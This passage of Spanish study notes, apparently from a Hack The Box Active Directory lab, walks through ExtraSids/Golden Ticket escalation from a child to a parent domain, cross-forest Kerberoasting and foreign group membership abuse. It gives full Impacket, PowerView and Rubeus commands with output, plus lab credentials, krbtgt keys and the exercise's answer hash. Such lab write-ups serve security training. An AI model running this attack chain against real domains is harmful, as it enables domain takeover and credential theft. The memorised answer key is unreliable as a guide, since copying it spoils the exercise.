El script realiza todo el proceso: obtiene el **SID de Enterprise Admins** del dominio padre, extrae el **hash KRBTGT** del hijo, crea un **Golden Ticket**, inicia sesión en el dominio padre, recupera las credenciales del **Administrador** y, si se usa el parámetro `--target-exec`, se autentica al **controlador de dominio padre mediante Psexec**.

##### Lanzando el ataque con `raiseChild.py`

```shell-session
amr251@htb[/htb]$ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
[*] Raising child domain LOGISTICS.INLANEFREIGHT.LOCAL
...SNIP...
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

El script lista la metodología de trabajo. Aunque herramientas como **raiseChild.py** ahorran tiempo, es fundamental **entender el proceso manual** y saber reunir los datos necesarios. Si la herramienta falla, podremos detectar el problema y corregirlo; si la usamos a ciegas, no. En entornos de producción debemos **evitar los scripts “autopwn”**, que ejecutan cadenas de ataque automáticamente (como los basados en BloodHound), ya que pueden causar daños o comportamientos imprevistos. Siempre es preferible usar herramientas que comprendamos por completo y construir los comandos manualmente para mantener **control y seguridad total** durante la auditoría.

##### _Perform the ExtraSids attack to compromise the parent domain from the Linux attack host. After compromising the parent domain obtain the NTLM hash for the Domain Admin user bross. Submit this hash as your answer._

> **Respuesta:** 49a074a39dd0651f647e765c2cc794c7 (No hemos terminado los apuntes aún)

Lo primero es conectarnos mediante SSH a la primera IP que nos dan. Una vez conectados, el primer paso es obtener el hash de la cuenta `krbtgt` utilizando `secretsdump.py`:

```bash
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```

> Cuando nos pida contraseña, es `HTB_@cademy_stdnt_admin!`

Ese comando está pidiéndole al controlador de dominio que te entregue las claves internas de la cuenta **krbtgt**, que es la cuenta que firma todos los tickets Kerberos del dominio. Impacket se hace pasar por otro controlador usando la interfaz de replicación (DRSUAPI), y como tu usuario tiene privilegios suficientes, el DC te devuelve el **NT hash** y las **claves Kerberos AES/DES** de esa cuenta. Con esas claves podrías generar tickets Kerberos falsos pero válidos (Golden Tickets), lo que equivale a obtener acceso total y persistente al dominio. En esencia: acabas de extraer la llave maestra que Kerberos usa para confiar en todo lo demás.

```bash
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065964d5f:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:d9a2d6659c2a182bc93913bbfa90ecbead94d49dad64d23996724390cb833fb8
krbtgt:aes128-cts-hmac-sha1-96:ca289e175c372cebd18083983f88c03e
krbtgt:des-cbc-md5:fee04c3d026d7538
```

Lo siguiente que haremos será obtener el SID del dominio hijo

```bash
impacket-lookupsid logistics.inlanefreight.local/htb-student_adm@172.16.5.240
```

![[Pasted image 20251130114729.png | 800]]

Seguidamente, lanzamos de nuevo el comando, apuntando esta vez a DC01 (INLANEFREIGHT)  como controlador de dominio en la IP 172.16.5.5 y obtenemos el SID del dominio:

```bash
impacket-lookupsid logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
```

![[Pasted image 20251130114944.png | 600]]

En este punto, usamos la herramienta `ticketer` de Impacket para generar un Golden Ticket, que nos da acceso al dominio hijo y al padre

```bash
impacket-ticketer
 -nthash 9d765b482771505cbe97411065964d5f
 -domain LOGISTICS.INLANEFREIGHT.LOCAL
 -domain-sid S-1-5-21-2806153819-209893948-922872689
 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
```

> `-nthash`: Lo obtuvimos al principio. Es el hash de la cuenta **krbtgt**
> `-domain`: El dominio al que pertenece el TGT
> `-domainsid`: El SID raíz del dominio hijo. En este caso, de `logistics.inlanefreight.local`
> `-extra-sid`: El SID del dominio padre, es decir, INLANEFREIGHT.

Con esto se generará en nuestro systema el ticket como un archivo ccache (credential cache), que guarda las credenciales de Kerberos. Establecemos la variable de entorno `KRB5CCNAME` y de esta manera el sistema usará dicho archivo para la autenticación por Kerberos.

```bash
export KRB5CCNAME=hacker.ccache 
```

> Es `hacker.ccache` porque hemos puesto dicho nombre con `ticketer`

Ahora comprobamos si gracias a dicho archivo podemos autenticarnos correctamente al DC del dominio padre:

```bash
impacket-psexec LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```

![[Pasted image 20251130120003.png]]

Hemos accedido correctamente. En este punto queda utilizar `raiseChild`, que automatizará la escalada del dominio hijo al padre.

```bash
impacket-raiseChild -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```

Accederá con éxito de nuevo. Vamos a recuperar el hash NTLM del administrador de dominio, que es lo que nos pide el ejercicio. En este caso, el usuario `bross`. 

```bash
└──╼ $impacket-secretsdump LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5 | grep "bross"
inlanefreight.local\bross:1179:aad3b435b51404eeaad3b435b51404ee:49a074a39dd0651f647e765c2cc794c7:::
```

Y ahí lo tenemos: `49a074a39dd0651f647e765c2cc794c7`

# Atacando confianzas de dominio – Abuso de confianzas entre bosques (_Cross-Forest_) – desde Windows

### Kerberoasting entre bosques

Ataques Kerberos como **Kerberoasting** o **ASREPRoasting** pueden ejecutarse a través de confianzas si la relación es **entrante o bidireccional**, permitiendo obtener acceso o privilegios en otro dominio. Incluso sin escalar en el dominio actual, es posible capturar y descifrar un ticket de un usuario con permisos administrativos en ambos dominios.  

Con **PowerView** podemos enumerar cuentas del dominio objetivo que tengan **SPNs** asociados.

##### Enumerando cuentas para SPNs asociados usando `Get-DomainUser`

```powershell
PS C:\> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName

samaccountname
--------------
krbtgt
mssqlsvc
```

Se detecta una cuenta con **SPN** en el dominio objetivo, perteneciente al grupo **Domain Admins**. Si logramos realizar **Kerberoasting** y descifrar su hash offline, obtendremos **acceso administrativo completo** al dominio objetivo. Enumeramos la cuenta `mssqlsvc`

```powershell
PS C:> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof

samaccountname memberof
-------------- --------
mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
```

Lancemos un ataque Kerberoasting usando `Rubeus`. Ejecutamos la herramienta como hicimos en la sección de [[#Kerberoasting]] pero incluyendo la flag `/domain:` para especificar el dominio objetivo.

```powershell
PS C:> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap

...SNIP...

[*] Hash                   : $krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLsvc/sql01.freightlogstics:1433@FREIGHTLOGISTICS.LOCAL*$<SNIP>
```

Luego podemos pasar el **hash** por **Hashcat** y, si se descifra, habremos ampliado rápidamente nuestro acceso, obteniendo **control total sobre ambos dominios** al aprovechar la autenticación y configuración de una **confianza bidireccional entre bosques**.

### Reutilización de la contraseña de admin y membresía de grupo

En confianzas **bidireccionales entre bosques**, si comprometemos el **Dominio A** y obtenemos contraseñas o hashes de administradores, puede existir **reutilización de contraseñas** con cuentas equivalentes en el **Dominio B**, lo que permitiría acceso total. También es común que administradores de un dominio sean miembros de grupos del otro (por ejemplo, _Administrators_ en B). Con **PowerView** y la función **Get-DomainForeignGroupMember** podemos identificar estos **miembros externos** y detectar posibles escaladas entre dominios.

```powershell
PS C:\htb> Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL

GroupDomain             : FREIGHTLOGISTICS.LOCAL
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL
MemberDomain            : FREIGHTLOGISTICS.LOCAL
MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500
MemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGIS
                          TICS,DC=LOCAL

PS C:\htb> Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500

INLANEFREIGHT\administrator
```

La salida del comando muestra que el grupo **Administrators** de **FREIGHTLOGISTICS.LOCAL** incluye como miembro la cuenta **Administrator** del dominio **INLANEFREIGHT.LOCAL**. Podemos comprobar este acceso conectándonos por **WinRM** mediante el cmdlet **Enter-PSSession**.

```powershell
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator

[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> whoami
inlanefreight\administrator

[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : ACADEMY-EA-DC03
   Primary Dns Suffix  . . . . . . . : FREIGHTLOGISTICS.LOCAL
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : FREIGHTLOGISTICS.LOCAL
```

La salida del comando confirma que logramos autenticarnos en el **controlador de dominio de FREIGHTLOGISTICS.LOCAL** usando la cuenta **Administrator** de **INLANEFREIGHT.LOCAL** a través de la **confianza bidireccional entre bosques**. Esto puede suponer un acceso rápido y valioso tras comprometer un dominio, por lo que siempre conviene comprobarlo si existe este tipo de relación y el segundo bosque está dentro del alcance de la auditoría.

### Abuso de SID History entre bosques (Cross-Forest)

El atributo **SID History** puede explotarse entre bosques si **SID Filtering** no está habilitado. En una migración, un usuario del **Bosque B** podría conservar el **SID** de una cuenta con privilegios del **Bosque A**, obteniendo así **acceso administrativo** al autenticarse entre bosques. En resumen, una migración sin filtrado de SIDs puede permitir mantener privilegios del dominio original en el nuevo bosque.

![[Pasted image 20251130165959.png | 800]]
